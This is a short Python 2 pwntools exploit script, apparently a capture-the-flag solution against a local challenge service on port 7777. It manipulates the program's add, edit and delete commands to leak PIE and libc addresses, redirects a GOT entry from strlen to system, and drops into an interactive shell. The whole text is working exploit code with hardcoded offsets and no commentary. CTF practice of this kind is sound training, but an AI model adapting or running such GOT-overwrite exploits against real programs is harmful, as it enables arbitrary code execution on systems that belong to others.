from pwn import *

#p = process('./prob')
p = remote('localhost', 7777)

def add(name, content):
    print p.sendafter('>>> ', '{0}={1}'.format(name, content))

def edit(name, new_name):
    print p.sendafter('>>> ', 'edit {0}'.format(name))
    sleep(0.5)
    p.send(new_name)

def delete(name):
    print p.sendafter('>>> ','delete {0}'.format(name))
    print p.recvline()

add('AAAA', 'B'*0x8+'\x00')
add('\xc0', 'D'*0x8+'\x00')
delete('AAAA')
add('\xc0', '\x28'+'\x00')
p.sendafter('>>> ', '\x00')
pie = u64(p.recvuntil('\n').split('\n')[0]+'\x00\x00')
base = pie - 0x594-0x3000
exit_got = base+0x3468
print hex(pie)
print hex(base)
print hex(exit_got)

delete('\x00')
add((p32((pie&0xffffffff)+0x2c)), p64(exit_got))
p.sendafter('>>> ', '\x00')
libc_base = u64(p.recvuntil('\n').split('\n')[0]+'\x00\x00')-0x49bc0
system = libc_base + 0x55410
strlen = libc_base + 0x18b660
print hex(libc_base)
print hex(system)
print hex(strlen)

delete('\x00')
add(p32((pie&0xffffffff)+0x2c), p64(base+0x3428)) #puts_got
edit(p32((strlen&0xffffffff)), p32(system&0xffffffff))
#p.send('\n')

p.interactive()
